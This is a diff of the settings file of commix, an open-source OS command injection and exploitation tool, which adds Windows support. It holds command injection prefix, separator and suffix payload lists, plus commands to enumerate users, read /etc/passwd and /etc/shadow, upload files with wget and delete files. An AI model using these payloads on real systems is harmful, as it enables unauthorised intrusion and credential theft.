@@ -20,19 +20,22 @@ import time
 import urllib
 
 """
- The global variables.
+The global variables.
 """
 
 # About
 APPLICATION = "commix"
 DESCRIPTION = "Automated All-in-One OS Command Injection and Exploitation Tool"
 AUTHOR  = "Anastasios Stasinopoulos"
-VERSION = "v0.2b"
+VERSION = "v0.3b"
 YEAR    = "2015"
 TWITTER = "@ancst" 
 
 # Inject Tag
 INJECT_TAG = "INJECT_HERE"
+
+# Default target host OS (Unix-like)
+TARGET_OS = "unix"
 
 # Check Commit ID
 if os.path.isdir("./.git"):
@@ -64,19 +67,19 @@ MAXLEN = "10000"
 SLOW_TARGET_RESPONSE = 3
 
 # The command injection prefixes.
-PREFIXES = ["", "'", "\"", "|", "&", "%27", "%22", "%7C", "%26"] 
+PREFIXES = ["", "'", "\"", "&", "%26", "|", "%7C", "%27", "%22"] 
 
 # The command injection separators.
-SEPARATORS = ["", " ", ";", "&", "|", "||", "&&", "%0a", "%3B", "%26", "%26%26", "%7C", "%7C%7C"]
+SEPARATORS = ["", " ", ";", "%3B", "&", "%26", "&&", "%26%26", "|", "%7C", "||", "%7C%7C", "%0a"]
 
 # The command injection suffixes.
-SUFFIXES = ["", "'", "\"", "#", "//", "\\\\", "&", "|", "%27", "%22", "%5C%5C", "%2F%2F", "%26", "%7C"]
+SUFFIXES = ["", "'", "\"", "#", "//", "\\\\", "&", "%26", "|", "%7C", "%27", "%22", "%5C%5C", "%2F%2F"]
 
 # Bad combination of prefix and separator
 JUNK_COMBINATION = ["&&&", "|||", "|&&", "&|", "&;", "|;", "%7C;", "%26;", "%7C&"]
 
 # Execution functions
-EXECUTION_FUNCTIONS = ["exec", "system", "shell_exec", "passthru",  "proc_open", "popen"]
+EXECUTION_FUNCTIONS = ["exec", "system", "shell_exec", "passthru", "proc_open", "popen"]
 
 # The code injection prefixes.
 EVAL_PREFIXES = ["", "'", ")", "')", "\")", "\".", "'.", ");}", "');}", "\");}"]
@@ -93,8 +96,8 @@ WHITESPACES = ["%20", "$IFS"]
 # Time delay
 DELAY = 1
 
-# Default Temp Directorya
-TMP_PATH = "/tmp/"
+# Default Temp Directory
+TMP_PATH = ""
 
 # Default Server's Root Directory
 SRV_ROOT_DIR = ""
@@ -109,22 +112,29 @@ PYTHON_VERSION = sys.version.split()[0]
 # Enumeration Commands
 # Current user
 CURRENT_USER = "whoami"
+WIN_CURRENT_USER = "echo %username%"
 
 # The hostname
 HOSTNAME = "hostname"
+WIN_HOSTNAME = "echo %computername%"
 
 # Check if current user is root
-ISROOT = "echo $(id -u)"
+IS_ROOT = "echo $(id -u)"
+# Check if current user is admin
+IS_ADMIN = "powershell.exe [Security.Principal.WindowsBuiltinRole]::Administrator"
 
 # Operation System.
 RECOGNISE_OS = "uname -s"
+WIN_RECOGNISE_OS = "ver"
 
 # Hardware platform.
 RECOGNISE_HP = "uname -m"
+WIN_RECOGNISE_HP = "echo %PROCESSOR_ARCHITECTURE%"
 
 # File System access options
 # Read file
 FILE_READ = "cat "
+WIN_FILE_READ = "type "
 
 # Write file
 FILE_WRITE = "echo "
@@ -135,6 +145,9 @@ FILE_UPLOAD = "wget "
 # /etc/passwd
 PASSWD_FILE = "/etc/passwd"
 SYS_USERS = "awk -F ':' '{print $1}{print $3}{print $6}' " + PASSWD_FILE 
+
+# Exports users of localgroup
+WIN_SYS_USERS = "powershell.exe write-host (([string]$(net user)[4..($(net user).length-3)])"
 
 # /etc/shadow
 SHADOW_FILE = "/etc/shadow"
@@ -148,6 +161,9 @@ CHOISE_NO = ['no','n']
 
 # Accepts 'QUIT','Q','quit','q'
 CHOISE_QUIT = ['q','quit']
+
+# Accepts 'W','w','U','u','Q','q'
+CHOISE_OS = ['w','u','q']
 
 # Accepts 'C','c','S','s','Q','q'
 CHOISE_PROCEED = ['c','s','q']
@@ -251,14 +267,28 @@ SERVER_BANNERS = [
     "Nginx"
 ]
 
+# Server banners list
+SERVER_OS_BANNERS = [
+    "win",
+    "debian",
+    "ubuntu",
+    "fedora",
+    "centos",
+    "freebsd"
+]
+
+REVERSE_TCP = False
+
 # Injection logs report
 SHOW_LOGS_MSG = False
 
 # Enumeration options
 ENUMERATION_DONE = False
+ENUMERATE_AGAIN = False
 
 # FIle access options
 FILE_ACCESS_DONE = False
+FILE_ACCESS_AGAIN = False
 
 # JSON Data
 IS_JSON = False
@@ -271,5 +301,22 @@ TFB_DECIMAL = False
 
 # Ignore Error Message
 IGNORE_ERR_MSG = False
+
+# Windows Python (2.7) installed directory.
+WIN_PYTHON_DIR = "C:\\Python27\\"
+
+# Windows PHP installed directory.
+WIN_PHP_DIR = "C:\\xampp\\php\\"
+
+# Windows comment
+WIN_COMMENT = "REM"
+
+#Delete command
+WIN_DEL = "DEL "
+DEL = "rm "
+
+# Time-based Variables
+FOUND_HOW_LONG = "" 
+FOUND_DIFF = ""
 
 #eof
